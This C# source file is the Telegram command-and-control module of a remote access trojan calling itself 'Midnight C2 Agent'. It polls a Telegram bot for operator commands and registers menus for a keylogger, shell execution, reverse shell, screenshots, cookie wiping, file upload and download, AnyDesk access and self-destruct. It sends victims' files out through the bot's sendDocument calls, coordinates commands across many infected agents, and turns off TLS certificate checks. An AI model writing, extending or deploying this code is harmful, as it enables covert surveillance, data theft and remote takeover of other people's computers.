using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Web;
using MidnightAgent.Core;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace MidnightAgent.Telegram
{
    /// <summary>
    /// Telegram Bot Service - handles connection and message sending
    /// Uses raw HTTP API (no external library needed)
    /// </summary>
    public class TelegramService
    {
        private readonly string _token;
        private readonly string _userId;
        private readonly CommandRouter _router;
        
        // Lazy ACK State
        private int _committedOffset = 0;
        private readonly System.Collections.Generic.HashSet<int> _processedUpdateIds = new System.Collections.Generic.HashSet<int>();


        private const string API_BASE = "https://api.telegram.org/bot";

        public TelegramService()
        {
            _token = Config.BotToken;
            _userId = Config.UserId;
            _router = new CommandRouter(this);

            // Disable SSL certificate validation (for restrictive environments)
            ServicePointManager.ServerCertificateValidationCallback = (s, cert, chain, errors) => true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            
            // Setup bot commands for autocomplete
            SetupCommands();
            
            // Setup bot profile (Bio/Description)
            SetupBotProfile();
        }

        private void SetupBotProfile()
        {
            try
            {
                // 1. Set Description (What users see *before* clicking Start)
                string descUrl = $"{API_BASE}{_token}/setMyDescription";
                var descData = new { description = "🌙 <b>Midnight C2 Agent</b>\n\nAdvanced Remote Administration Tool.\n\nType /menu to open controls.\nType /help for command list." };
                PostJson(descUrl, descData);

                // 2. Set Short Description (Shown in chat list / profile)
                string shortUrl = $"{API_BASE}{_token}/setMyShortDescription";
                var shortData = new { short_description = "Midnight C2 Controller 🚀" };
                PostJson(shortUrl, shortData);
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"[Telegram] SetupProfile Error: {ex.Message}");
            }
        }

        /// <summary>
        /// Setup bot commands for Telegram menu autocomplete
        /// </summary>
        private void SetupCommands()
        {
            try
            {
                var commands = new[]
                {
                    new { command = "help", description = "Show commands" },
                    new { command = "any", description = "Remote Desktop (AnyDesk)" },
                    new { command = "job", description = "Select active agent(s)" },
                    new { command = "menu", description = "Show interactive menu" },
                    new { command = "info", description = "System information" },
                    new { command = "cmd", description = "Execute shell command" },
                    new { command = "cd", description = "Change directory" },
                    new { command = "keylogger", description = "Start/Stop/Dump Keylogger" },
                    new { command = "clearcookie", description = "List/Wipe Cookies" },
                    new { command = "screenshot", description = "Capture screenshot" },
                    new { command = "download", description = "Download file" },
                    new { command = "upload", description = "Upload file" },
                    new { command = "process", description = "List processes" },
                    new { command = "killproc", description = "Kill process by PID" },
                    new { command = "location", description = "Get IP location" },
                    new { command = "wallpaper", description = "Change wallpaper" },
                    new { command = "revshell", description = "Start reverse shell" },
                    new { command = "update", description = "Update agent" },
                    new { command = "terminate", description = "Stop agent" },
                    new { command = "selfdestruct", description = "Remove agent" }
                };

                string url = $"{API_BASE}{_token}/setMyCommands";
                string json = Newtonsoft.Json.JsonConvert.SerializeObject(new { commands = commands });
                
                System.Diagnostics.Debug.WriteLine($"[Telegram] Setting commands: {json}");

                try
                {
                    using (var client = new System.Net.WebClient())
                    {
                        client.Encoding = System.Text.Encoding.UTF8;
                        client.Headers.Add("Content-Type", "application/json");
                        client.UploadString(url, "POST", json);
                        System.Diagnostics.Debug.WriteLine("[Telegram] Commands set successfully.");
                    }
                }
                catch (System.Net.WebException wex)
                {
                    if (wex.Response != null)
                    {
                        using (var stream = wex.Response.GetResponseStream())
                        using (var reader = new System.IO.StreamReader(stream))
                        {
                            string error = reader.ReadToEnd();
                            System.Diagnostics.Debug.WriteLine($"[Telegram] Failed to set commands: {error}");
                        }
                    }
                    else
                    {
                        System.Diagnostics.Debug.WriteLine($"[Telegram] Failed to set commands: {wex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"[Telegram] SetupCommands Fatal Error: {ex.Message}");
            }
        }

        /// <summary>
        /// Start polling for updates (blocking) with Lazy ACK
        /// </summary>
        private Random _random = new Random();

        // Local Time Tracking for Retention
        private readonly System.Collections.Generic.Dictionary<int, DateTime> _updateFirstSeenParams = new System.Collections.Generic.Dictionary<int, DateTime>();
        private const int RETENTION_SECONDS = 120; // Keep updates visible for 120s (2 mins) to allow all agents to sync

        /// <summary>
        /// Start polling for updates (blocking) with Broadcast-Friendly Lazy ACK
        /// </summary>
        public void StartPolling(CancellationToken ct)
        {
            // Initial Random Delay to desync multiple agents slightly
            Thread.Sleep(_random.Next(1000, 5000));

            // [STARTUP CLEANUP]
            // Flush old updates so we don't re-process commands sent while we were offline/restarting.
            try 
            {
                var initialUpdates = GetUpdates();
                if (initialUpdates != null && initialUpdates.Count > 0)
                {
                    int maxId = 0;
                    foreach(var u in initialUpdates)
                    {
                        int uid = u["update_id"].Value<int>();
                        if (uid > maxId) maxId = uid;
                    }
                    if (maxId > 0)
                    {
                        // We do NOT call API to delete them (lazy ack logic might still need them involved elsewhere)
                        // BUT we mark them as "processed" or simply skip logic locally.
                        // Actually, for "Broadcast" to work, we CANNOT delete them from Server if other agents need them.
                        // So we just add them to _processedUpdateIds locally so WE don't run them.
                        
                        foreach(var u in initialUpdates)
                        {
                            int uid = u["update_id"].Value<int>();
                            _processedUpdateIds.Add(uid);
                            // Also mark as 'Seen' so retention logic handles cleanup eventually
                            _updateFirstSeenParams[uid] = DateTime.Now.AddSeconds(-RETENTION_SECONDS); // Mark as old
                        }
                        
                        System.Diagnostics.Debug.WriteLine($"[Startup] Ignored {initialUpdates.Count} pending updates.");
                    }
                }
            }
            catch {}

            while (!ct.IsCancellationRequested)
            {
                try
                {
                    JArray updates = GetUpdates();
                    if (updates == null || updates.Count == 0)
                    {
                        // Random delay retry
                        Thread.Sleep(_random.Next(2000, 4000)); 
                        continue;
                    }

                    int maxUpdateIdInBatch = 0;
                    bool readyToCommit = true;

                    foreach (var update in updates)
                    {
                        int updateId = update["update_id"].Value<int>();
                        maxUpdateIdInBatch = Math.Max(maxUpdateIdInBatch, updateId);

                        // 1. Process Update (If new to us)
                        if (!_processedUpdateIds.Contains(updateId))
                        {
                            _processedUpdateIds.Add(updateId);
                            _updateFirstSeenParams[updateId] = DateTime.Now; // Track local discovery time
                            
                            try
                            {
                                System.Diagnostics.Debug.WriteLine($"[Broadcast] Processing New Update: {updateId}");
                                ProcessUpdate(update);
                            }
                            catch (Exception ex)
                            {
                                System.Diagnostics.Debug.WriteLine($"Process update error: {ex.Message}");
                            }
                        }

                        // 2. Check Retention (Should we let others see this?)
                        if (_updateFirstSeenParams.ContainsKey(updateId))
                        {
                            double ageSeconds = (DateTime.Now - _updateFirstSeenParams[updateId]).TotalSeconds;
                            if (ageSeconds < RETENTION_SECONDS)
                            {
                                // This update is too fresh! We must NOT acknowledge it to Telegram yet.
                                // This forces Telegram to re-send this update to OTHER agents polling now.
                                readyToCommit = false;
                            }
                        }
                    }

                    // --- BROADCAST ACK LOGIC ---
                    if (readyToCommit && maxUpdateIdInBatch > 0)
                    {
                        // All messages in this batch are old enough. effectively "expired" from our local perspective.
                        // We assume other agents have had chance to see them.
                        // Now we can safely tell Telegram to invoke `offset` to delete them.
                        
                        System.Diagnostics.Debug.WriteLine($"[Broadcast] Committing Offset -> {maxUpdateIdInBatch + 1}");
                        _committedOffset = maxUpdateIdInBatch + 1;

                        // Cleanup memory
                        var keysToRemove = new System.Collections.Generic.List<int>();
                        foreach(var kvp in _updateFirstSeenParams)
                        {
                            if (kvp.Key <= maxUpdateIdInBatch) keysToRemove.Add(kvp.Key);
                        }
                        foreach(var k in keysToRemove) _updateFirstSeenParams.Remove(k);
                        _processedUpdateIds.RemoveWhere(id => id <= maxUpdateIdInBatch);
                    }
                    else
                    {
                        // Hold back! Don't confirm receipt to Telegram yet.
                        // Just loop again. effectively "Peeking" the queue.
                        System.Diagnostics.Debug.WriteLine($"[Broadcast] Holding updates for others... (Batch Max: {maxUpdateIdInBatch})");
                        Thread.Sleep(_random.Next(2000, 4000));
                    }
                }
                catch (WebException ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Network error: {ex.Message}");
                    Thread.Sleep(5000);
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Polling error: {ex.Message}");
                    Thread.Sleep(5000);
                }
            }
        }

        /// <summary>
        /// Send text message
        /// </summary>
        public void SendMessage(string text, long? chatId = null)
        {
            try
            {
                string targetChatId = chatId?.ToString() ?? _userId;
                string url = $"{API_BASE}{_token}/sendMessage";
                
                var data = new
                {
                    chat_id = targetChatId,
                    text = text,
                    parse_mode = "HTML"
                };

                PostJson(url, data);
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Send message error: {ex.Message}");
            }
        }

        /// <summary>
        /// Send file/document
        /// </summary>
        public void SendDocument(string filePath, string caption = null, long? chatId = null)
        {
            try
            {
                string targetChatId = chatId?.ToString() ?? _userId;
                string url = $"{API_BASE}{_token}/sendDocument";

                using (var client = new WebClient())
                {
                    byte[] fileBytes = File.ReadAllBytes(filePath);
                    string fileName = Path.GetFileName(filePath);

                    // Build multipart form
                    string boundary = "----" + DateTime.Now.Ticks.ToString("x");
                    client.Headers.Add("Content-Type", "multipart/form-data; boundary=" + boundary);

                    using (var ms = new MemoryStream())
                    {
                        // chat_id
                        WriteFormField(ms, boundary, "chat_id", targetChatId);
                        
                        // caption (optional)
                        if (!string.IsNullOrEmpty(caption))
                        {
                            WriteFormField(ms, boundary, "caption", caption);
                        }

                        // document file
                        WriteFormFile(ms, boundary, "document", fileName, fileBytes);

                        // End boundary
                        byte[] endBoundary = Encoding.UTF8.GetBytes($"\r\n--{boundary}--\r\n");
                        ms.Write(endBoundary, 0, endBoundary.Length);

                        byte[] formData = ms.ToArray();
                        client.UploadData(url, "POST", formData);
                    }
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Send document error: {ex.Message}");
                // Try to send error message
                try
                {
                    SendMessage($"❌ Failed to send file: {ex.Message}", chatId);
                }
                catch { }
            }
        }

        /// <summary>
        /// Send raw bytes as document
        /// </summary>
        public void SendDocument(byte[] data, string fileName, string caption = null, long? chatId = null)
        {
            // Save to temp file and send
            string tempPath = Path.Combine(Path.GetTempPath(), fileName);
            try
            {
                File.WriteAllBytes(tempPath, data);
                SendDocument(tempPath, caption, chatId);
            }
            finally
            {
                try { File.Delete(tempPath); } catch { }
            }
        }

        /// <summary>
        /// Send Interactive Main Menu (Inline Buttons)
        /// </summary>
        public void SendMainMenu(long chatId)
        {
            try
            {
                string url = $"{API_BASE}{_token}/sendMessage";
                
                var keyboardLayout = new[]
                {
                    new[] { new { text = "ℹ️ Info", callback_data = "/info" }, new { text = "📸 Screenshot", callback_data = "/screenshot" } },
                    new[] { new { text = "📍 Location", callback_data = "/location" }, new { text = "📶 Online Status", callback_data = "/job list" } },
                    new[] { new { text = "📊 Process", callback_data = "/process" }, new { text = "👤 Whoami", callback_data = "/cmd whoami" } },
                    new[] { new { text = "⌨️ Keylogger Start", callback_data = "/keylogger start" }, new { text = "📥 Keylogger Dump", callback_data = "/keylogger dump" } },
                    new[] { new { text = "🍪 Clear Cookies", callback_data = "/clearcookie" }, new { text = "🖥️ AnyDesk", callback_data = "/any start" } },
                    new[] { new { text = "🔄 Reboot Agent", callback_data = "/reboot" }, new { text = "❓ Help", callback_data = "/help" } }
                };

                var data = new
                {
                    chat_id = chatId,
                    text = "📱 <b>Agent Menu</b>\nSelect executed command:",
                    parse_mode = "HTML",
                    reply_markup = new
                    {
                        // Use Inline Keyboard (Attached to message) as requested
                        inline_keyboard = keyboardLayout
                    }
                };

                PostJson(url, data);
            }
            catch (Exception ex)
            {
                 System.Diagnostics.Debug.WriteLine($"SendMainMenu error: {ex.Message}");
            }
        }

        /// <summary>
        /// Answer callback query (stop loading spinner)
        /// </summary>
        public void AnswerCallback(string callbackQueryId, string text = null)
        {
            try
            {
                string url = $"{API_BASE}{_token}/answerCallbackQuery";
                var data = new { callback_query_id = callbackQueryId, text = text };
                PostJson(url, data);
            }
            catch { }
        }

        /// <summary>
        /// Download file from Telegram
        /// </summary>
        public byte[] DownloadFile(string fileId)
        {
            try
            {
                // Get file path
                string url = $"{API_BASE}{_token}/getFile?file_id={fileId}";
                string response = GetString(url);
                var json = JObject.Parse(response);
                
                if (json["ok"]?.Value<bool>() != true)
                {
                    System.Diagnostics.Debug.WriteLine($"getFile failed: {response}");
                    return null;
                }
                
                string filePath = json["result"]["file_path"]?.ToString();
                if (string.IsNullOrEmpty(filePath))
                {
                    System.Diagnostics.Debug.WriteLine("file_path is empty");
                    return null;
                }

                // Download file (with timeout for large files)
                string downloadUrl = $"https://api.telegram.org/file/bot{_token}/{filePath}";
                
                using (var client = new WebClient())
                {
                    // Set timeout to 5 minutes for large files
                    ServicePointManager.MaxServicePointIdleTime = 300000;
                    
                    System.Diagnostics.Debug.WriteLine($"Downloading from: {downloadUrl}");
                    byte[] data = client.DownloadData(downloadUrl);
                    System.Diagnostics.Debug.WriteLine($"Downloaded {data.Length} bytes");
                    return data;
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Download error: {ex.Message}");
                return null;
            }
        }

        private JArray GetUpdates()
        {
            // Use _committedOffset to poll. If 0, it fetches default pending.
            string offsetParam = (_committedOffset > 0) ? $"offset={_committedOffset}&" : "";
            string url = $"{API_BASE}{_token}/getUpdates?{offsetParam}timeout={Config.PollingTimeout}";
            string response = GetString(url);
            
            var json = JObject.Parse(response);
            if (json["ok"]?.Value<bool>() == true)
            {
                return json["result"] as JArray ?? new JArray();
            }
            
            return new JArray();
        }

        private void ProcessUpdate(JToken update)
        {
            // _lastUpdateId logic removed (Handled by StartPolling Lazy ACK now)
            
            // Check for Message
            var message = update["message"];
            if (message != null)
            {
                long chatId = message["chat"]["id"].Value<long>();
                if (chatId.ToString() != _userId) return;

                string text = message["text"]?.ToString();
                var document = message["document"];
                
                if (!string.IsNullOrEmpty(text))
                {
                    _router.HandleCommand(text, chatId, document);
                }
                else if (document != null)
                {
                    _router.HandleFileReceived(document, chatId);
                }
            }

            // Check for Callback Query (Inline Button Click)
            var callback = update["callback_query"];
            if (callback != null)
            {
                string id = callback["id"].ToString();
                long chatId = callback["message"]["chat"]["id"].Value<long>();
                string data = callback["data"]?.ToString();
                
                if (chatId.ToString() != _userId) return;

                // Acknowledge the callback (stops loading spinner)
                AnswerCallback(id, $"Executing {data}...");

                if (!string.IsNullOrEmpty(data))
                {
                    // Route as command
                    _router.HandleCommand(data, chatId);
                }
            }
        }

        // --- Helper Methods ---

        private string GetString(string url)
        {
            using (var client = new WebClient())
            {
                client.Encoding = Encoding.UTF8;
                return client.DownloadString(url);
            }
        }

        private void PostJson(string url, object data)
        {
            using (var client = new WebClient())
            {
                client.Encoding = Encoding.UTF8;
                client.Headers.Add("Content-Type", "application/json");
                string json = JsonConvert.SerializeObject(data);
                client.UploadString(url, "POST", json);
            }
        }

        private void WriteFormField(MemoryStream ms, string boundary, string name, string value)
        {
            string header = $"\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}";
            byte[] headerBytes = Encoding.UTF8.GetBytes(header);
            ms.Write(headerBytes, 0, headerBytes.Length);
        }

        private void WriteFormFile(MemoryStream ms, string boundary, string name, string fileName, byte[] data)
        {
            string header = $"\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"; filename=\"{fileName}\"\r\nContent-Type: application/octet-stream\r\n\r\n";
            byte[] headerBytes = Encoding.UTF8.GetBytes(header);
            ms.Write(headerBytes, 0, headerBytes.Length);
            ms.Write(data, 0, data.Length);
        }
    }
}
